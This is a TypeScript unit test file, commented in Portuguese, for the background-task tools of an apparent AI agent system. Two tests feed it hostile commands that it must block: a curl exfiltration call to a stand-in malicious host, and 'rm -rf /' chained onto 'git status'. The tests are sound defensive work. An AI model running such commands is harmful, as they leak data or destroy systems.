/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 *
 * Testes Unitários dos Sub-Agentes / Background Workers (Fase 3) — LIORA
 * Valida: enfileiramento, execução real, progresso, cancelamento seguro,
 * persistência, whitelist de comandos e bloqueio de injeção.
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import {
  backgroundWorkerManager
} from '../src/core/backgroundWorkers';
import {
  startBackgroundTaskTool,
  checkBackgroundTaskStatusTool,
  cancelBackgroundTaskTool,
  listBackgroundTasksTool
} from '../src/tools/async/backgroundTools';

// Helpers de espera
const waitFor = async (cond: () => boolean, timeoutMs = 15000): Promise<void> => {
  const start = Date.now();
  while (!cond()) {
    if (Date.now() - start > timeoutMs) throw new Error('TIMEOUT esperando condição do teste');
    await new Promise(r => setTimeout(r, 100));
  }
};

test('BG-01: ferramentas declaradas com níveis de risco corretos', () => {
  assert.strictEqual(startBackgroundTaskTool.name, 'start_background_task');
  assert.strictEqual(startBackgroundTaskTool.riskLevel, 'R2');
  assert.strictEqual(checkBackgroundTaskStatusTool.name, 'check_background_task_status');
  assert.strictEqual(checkBackgroundTaskStatusTool.riskLevel, 'R1');
  assert.strictEqual(cancelBackgroundTaskTool.name, 'cancel_background_task');
  assert.strictEqual(cancelBackgroundTaskTool.riskLevel, 'R2');
  assert.strictEqual(listBackgroundTasksTool.name, 'list_background_tasks');
  assert.strictEqual(listBackgroundTasksTool.riskLevel, 'R1');
  assert.strictEqual(startBackgroundTaskTool.isSimulated, false);
});

test('BG-02: whitelist de comandos bloqueia binários não autorizados', async () => {
  const res = await startBackgroundTaskTool.execute({
    kind: 'shell',
    title: 'Teste bloqueio',
    command: 'curl http://malicioso.com/exfiltrar'
  });
  assert.strictEqual(res.success, false);
  assert.match(String(res.error), /COMMAND_NOT_IN_WHITELIST/);
});

test('BG-03: bloqueia injeção de shell', async () => {
  const res = await startBackgroundTaskTool.execute({
    kind: 'shell',
    title: 'Teste injeção',
    command: 'git status; rm -rf /'
  });
  assert.strictEqual(res.success, false);
  assert.match(String(res.error), /COMMAND_INJECTION_BLOCKED/);
});

test('BG-04: comando obrigatório para kind=shell', async () => {
  const res = await startBackgroundTaskTool.execute({
    kind: 'shell',
    title: 'Sem comando'
  });
  assert.strictEqual(res.success, false);
  assert.match(String(res.error), /MISSING_COMMAND/);
});

test('BG-05: tarefa wait_test executa real com progresso e completa', async () => {
  const start = await startBackgroundTaskTool.execute({
    kind: 'wait_test',
    title: 'TESTE-BG-WAIT',
    ms: 1000
  });
  assert.strictEqual(start.success, true, `start falhou: ${start.error || ''}`);
  const taskId = String(start.taskId);

  // Aguarda terminar (max 15s)
  await waitFor(() => backgroundWorkerManager.getStatus(taskId)?.status === 'completed');

  const status = await checkBackgroundTaskStatusTool.execute({ taskId });
  assert.strictEqual(status.success, true);
  assert.strictEqual(status.task.status, 'completed');
  assert.ok((status.task.progress ?? 0) === 100);
  assert.ok(Array.isArray(status.task.logs) && status.task.logs.length > 0, 'logs de execução presentes');
  assert.ok(status.task.logs.some((l: string) => l.includes('10/10')), 'progresso incremental registrado');
});

test('BG-06: tarefa shell real executa e captura stdout nos logs', async () => {
  const start = await startBackgroundTaskTool.execute({
    kind: 'shell',
    title: 'TESTE-BG-ECHO',
    command: 'echo liora-bg-test-ok'
  });
  assert.strictEqual(start.success, true);
  const taskId = String(start.taskId);

  await waitFor(() => {
    const s = backgroundWorkerManager.getStatus(taskId)?.status;
    return s === 'completed' || s === 'failed';
  });

  const status = await checkBackgroundTaskStatusTool.execute({ taskId });
  assert.strictEqual(status.task.status, 'completed', `status: ${status.task.status}, logs: ${JSON.stringify(status.task.logs).slice(0, 200)}`);
  assert.ok(status.task.logs.some((l: string) => l.includes('liora-bg-test-ok')), 'stdout capturado nos logs');
});

test('BG-07: cancelamento seguro de tarefa longa', async () => {
  const start = await startBackgroundTaskTool.execute({
    kind: 'wait_test',
    title: 'TESTE-BG-CANCEL',
    ms: 60000 // longa
  });
  assert.strictEqual(start.success, true);
  const taskId = String(start.taskId);

  // Aguarda começar a rodar
  await waitFor(() => backgroundWorkerManager.getStatus(taskId)?.status === 'running');

  const cancel = await cancelBackgroundTaskTool.execute({ taskId, reason: 'teste de cancelamento' });
  assert.strictEqual(cancel.success, true);

  const status = await checkBackgroundTaskStatusTool.execute({ taskId });
  assert.strictEqual(status.task.status, 'cancelled');
  assert.match(String(status.task.error), /CANCELLED/);
});

test('BG-08: cancelar tarefa inexistente ou concluída falha graciosamente', async () => {
  const notFound = await cancelBackgroundTaskTool.execute({ taskId: 'btask-inexistente' });
  assert.strictEqual(notFound.success, false);
  assert.match(String(notFound.error), /TASK_NOT_FOUND/);
});

test('BG-09: status de tarefa inexistente falha graciosamente', async () => {
  const res = await checkBackgroundTaskStatusTool.execute({ taskId: 'btask-fantasma' });
  assert.strictEqual(res.success, false);
  assert.match(String(res.error), /TASK_NOT_FOUND/);
});

test('BG-10: list_background_tasks retorna histórico com tarefas criadas', async () => {
  const res = await listBackgroundTasksTool.execute({ limit: 50 });
  assert.strictEqual(res.success, true);
  assert.ok(Array.isArray(res.tasks));
  // As tarefas dos testes anteriores devem estar no histórico
  const titles = res.tasks.map((t: any) => t.title);
  assert.ok(titles.some((t: string) => t.startsWith('TESTE-BG-')), 'histórico contém as tarefas de teste');
  const first = res.tasks[0];
  assert.ok(typeof first.status === 'string' && typeof first.id === 'string');
});

test('BG-11: file_scan valida diretório inexistente', async () => {
  const res = await startBackgroundTaskTool.execute({
    kind: 'file_scan',
    title: 'TESTE-BG-SCAN-INVALIDO',
    dir: 'Z:\\nao\\existe\\nunca'
  });
  // O enqueue aceita; a falha de execução aparece no status
  if (res.success) {
    const taskId = String(res.taskId);
    await waitFor(() => {
      const s = backgroundWorkerManager.getStatus(taskId)?.status;
      return s === 'failed' || s === 'completed';
    });
    const status = await checkBackgroundTaskStatusTool.execute({ taskId });
    assert.strictEqual(status.task.status, 'failed');
    assert.match(String(status.task.error), /DIR_NOT_FOUND|NOT_A_DIRECTORY/);
  } else {
    assert.match(String(res.error), /MISSING_DIR/);
  }
});
